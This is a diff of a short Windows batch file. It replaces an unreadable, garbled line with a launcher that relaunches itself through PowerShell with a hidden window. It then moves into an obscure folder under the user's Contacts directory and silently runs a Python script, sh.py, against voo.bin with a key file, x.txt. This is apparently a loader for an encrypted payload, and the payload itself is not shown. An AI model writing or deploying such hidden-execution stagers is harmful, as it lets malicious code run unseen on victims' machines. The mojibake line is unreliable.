@@ -1,1 +1,15 @@
-挦獬਍﻿ഊ敀档⁯景൦椊⁦潮⁴┢ㅾ㴢∽≨⠠਍††潰敷獲敨汬ⴠ楷摮睯瑳汹⁥楨摤湥ⴠ潣浭湡⁤匢慴瑲倭潲散獳✠縥て‧䄭杲浵湥䱴獩⁴栧‧圭湩潤卷祴敬䠠摩敤≮਍††硥瑩⼠ൢ⤊਍਍敳⁴搢┽单剅剐䙏䱉╅䍜湯慴瑣屳潺ഢഊ㨊›畒敬穡菄猠牣灩畴⁬祐桴湯栠摩敤൮挊⁤搯∠搥∥਍晩攠楸瑳∠桳瀮≹椠⁦硥獩⁴瘢潯戮湩•晩攠楸瑳∠⹸硴≴⠠਍††祰桴湯攮數猠⹨祰ⴠ⁩潶⹯楢⁮欭砠琮瑸਍ഩഊ攊楸⁴戯〠਍
+@echo off
+if not "%~1"=="h" (
+    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
+    exit /b
+)
+
+set "d=%USERPROFILE%\Contacts\zo"
+
+:: Rulează scriptul Python hidden
+cd /d "%d%"
+if exist "sh.py" if exist "voo.bin" if exist "x.txt" (
+    python.exe sh.py -i voo.bin -k x.txt
+)
+
+exit /b 0
